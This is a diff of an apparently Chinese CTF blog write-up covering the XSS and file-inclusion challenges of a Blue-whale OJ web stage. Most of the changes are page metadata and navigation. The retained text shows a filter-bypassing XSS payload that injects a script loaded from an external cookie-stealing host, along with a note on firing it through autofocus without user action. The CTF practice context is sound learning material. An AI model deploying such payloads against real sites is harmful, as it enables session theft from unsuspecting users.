@@ -23,7 +23,7 @@
 <meta property="og:image" content="https://s2.ax1x.com/2020/03/09/8C9KA0.jpg">
 <meta property="og:image" content="https://s2.ax1x.com/2020/03/09/8CCqQe.jpg">
 <meta property="og:image" content="https://s2.ax1x.com/2020/03/09/8Ci6u4.jpg">
-<meta property="og:updated_time" content="2020-03-09T15:32:30.314Z">
+<meta property="og:updated_time" content="2020-03-10T12:31:35.071Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Stage1Day2 Web">
 <meta name="twitter:description" content="Blue-whale OJBabyXSS、XSS1、BasicFileInclude writeup.">
@@ -183,7 +183,7 @@
       <span class="post-meta-item-icon" style="color:	#636363;font-size:14px;">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">870字</span>
+        <span class="post-count">982字</span>
       </span>
     </span>
 
@@ -235,13 +235,16 @@
 
 <p>可以看到本题对” &lt; &gt; 以及回车进行了过滤，便考虑使用html编码来绕过。</p>
 <table><tr><td bgcolor="#87CEFA">hello&quot;;document.write(&quot;&lt;img&#32;src=x&#32;onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.fbisb.com/NXEO';&gt;&quot;);//</td></tr></table>
-先将双引号闭合，再使用document.write()在html中写进去一个src属性为cookie偷取链接的img标签，最后将后面的一个双引号注释掉。此处之注意将空格也进行编码处理（在提交的页面会进行检测）。输入文本框提交看看效果：
+先将双引号闭合，再在html中写进去一个src属性为x（会出错）的img标签，然后onerror会在html中写进去一个src属性为cookie偷取链接的script，最后将后面的一个双引号注释掉。此处之注意将空格也进行编码处理（在提交的页面会进行检测）。输入文本框提交看看效果：
 
 <center><img src="https://s2.ax1x.com/2020/03/09/8CCqQe.jpg" alt="8CCqQe.jpg" border="0"></center>
 
 <p>可以看到成功地写入了上面提到的img标签，并触发了chrome XSS Auditor的预警。</p>
 <blockquote>
 <p>PS:不知道出了什么问题XSS平台一直收不到cookie，有待进一步观察</p>
+</blockquote>
+<blockquote>
+<p>注意到hint里提示，发现输入框有autofocus属性，想到可以结合onfocus来触发XSS，但是这个输入框已经闭合了，注入点并不在其中，又想到自己搞一个文本框，设置一个autofocus，这样管理员进入评论管理版后不用任何操作就会发送flag，但实测这样貌似还是不行</p>
 </blockquote>
 <h1 id="BasicFileInclude"><a href="#BasicFileInclude" class="headerlink" title="BasicFileInclude"></a>BasicFileInclude</h1><center><img src="https://s2.ax1x.com/2020/03/09/8Ci6u4.jpg" alt="8Ci6u4.jpg" border="0"></center>
 
@@ -305,6 +308,15 @@
 
   
 <nav id="article-nav">
+  
+    <a href="/2020-03-10/Stage1Day3-Web-Misc/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          Stage1Day3 Web&amp;Misc
+        
+      </div>
+    </a>
   
   
     <a href="/2020-03-08/Stage1Day1-Web/" id="article-nav-older" class="article-nav-link-wrap">
@@ -495,11 +507,11 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">工作</a>
+                <a href="javascript:void(0)" class="js-tag color4">IDS</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">IDS</a>
+                <a href="javascript:void(0)" class="js-tag color3">工作</a>
               </li>
             
             <div class="clearfix"></div>
